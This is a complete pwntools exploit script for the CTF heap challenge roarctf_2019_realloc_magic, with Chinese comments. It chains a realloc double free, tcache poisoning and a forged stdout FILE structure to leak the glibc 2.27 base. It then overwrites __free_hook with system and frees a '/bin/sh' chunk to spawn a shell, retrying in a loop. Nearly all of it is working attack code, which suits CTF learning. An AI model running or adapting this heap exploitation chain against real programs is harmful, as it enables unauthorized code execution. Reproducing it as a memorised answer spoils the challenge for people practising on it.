from pwn import *
from LibcSearcher import LibcSearcher
from sys import argv

s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
# context(os='linux', arch='amd64', log_level='debug')

binary = './roarctf_2019_realloc_magic'

context.binary = binary
elf = ELF(binary)
libc = ELF('/home/javayuan/pwn_libc合集/Ubuntu18_64/libc-2.27.so')

# patchelf --set-interpreter /lib64/2_27-linux.so.2 ./pwn
# patchelf --replace-needed libc.so.6 /home/javayuan/pwn_libc合集/Ubuntu18_64/libc-2.27.so ./pwn  #libc.so.6为需要替换的libc路径 第二个参数是需要加载的glibc的目录    pwn 是二进制文件


def debug(cmd=''):
     gdb.attach(r,cmd)
def bytes2int(content):
	return str(content,encoding='utf-8')

def int2bytes(content):
	return bytes(str(content),encoding='utf-8')
#---------------------------------------------

def realloc(size,content):
    sla(b'>> ',b'1')
    sla(b'Size?\n',int2bytes(size))
    sa(b'Content?\n',content)
def delete():
    sla(b'>> ',b'2')
def ba666():
    sla(b'>> ',b'666')

#------------------------------------
def pwn():

    # ------------------------------------
    # #realloc double free
    realloc(0x70,b'aaaa')
    realloc(0,b'')
    realloc(0x100,b'bbbb')
    realloc(0,b'')
    realloc(0xa0,b'c')
    realloc(0,b'')
    realloc(0x100,b'a')
    for i in range(7):
        delete()#这里不能使用realloc(0)的原因是代码未realloc_ptr = realloc(realloc_ptr, size)，当size为0时，realloc会对ptr进行free并返回NULL
    realloc(0,b'')#同理，这里不能使用free是因为下面要从tcache中取chunk，所以要先把prt置0

    # ------------------------------------
    # #realloc_overlap
    realloc(0x70,b'aaaa')
    realloc(0x180,b'a'*0x78+p64(0x41)+p8(0x60)+p8(0x87))#这里这个过程应该是realloc扩展0x70到0x180，先释放0x70，找0x180发生unsorted_bin合并得到0x180的tcache再分配
    # ------------------------------------

    # #IO_leak
    realloc(0,b'')#清空ptr
    realloc(0x100,b'a')
    realloc(0,b'')#清空ptr
    realloc(0x100,p64(0xfbad1887)+p64(0)*3+p8(0x58))

    #------------------------------------
    print(hex(libc.sym['_IO_file_jumps']))
    libc_base=uu64(p.recvuntil(b"\x7f",drop=False,timeout=0.1)[-6:])-libc.sym['_IO_file_jumps']#if time>0.1,uu64()=0
    #注意这里不能用ru来写，因为上面的宏定义中没有timeout参数
    if libc_base == -0x3e82a0:
        exit(-1)
    print(hex(libc_base))
    free_hook=libc_base+libc.sym['__free_hook']
    system=libc_base+libc.sym['system']
    #--------------------------------------

    # realloc double free
    ba666()
    realloc(0x120,b'a')
    realloc(0,b'')
    realloc(0x130,b'a')
    realloc(0,b'')
    realloc(0x170,b'a')
    realloc(0,b'')
    realloc(0x130,b'a')
    for i in range(7):
        delete()
    realloc(0,b'')
    realloc(0x120,b'a')
    realloc(0x260,b'a'*0x128+p64(0x41)+p64(free_hook-8))
    realloc(0,b'')
    realloc(0x130,b'a')
    realloc(0,b'')
    realloc(0x130,b'/bin/sh\x00'+p64(system))
    delete()
    itr()

if __name__ == "__main__":
    i=0
    while i<=70:
    # if i == 0:
        i+=1
        # r = remote("node4.buuoj.cn",26645)
        p=process('./roarctf_2019_realloc_magic')
        try:
            pwn()
        except:
            p.close()
#debug()
#r.interactive()
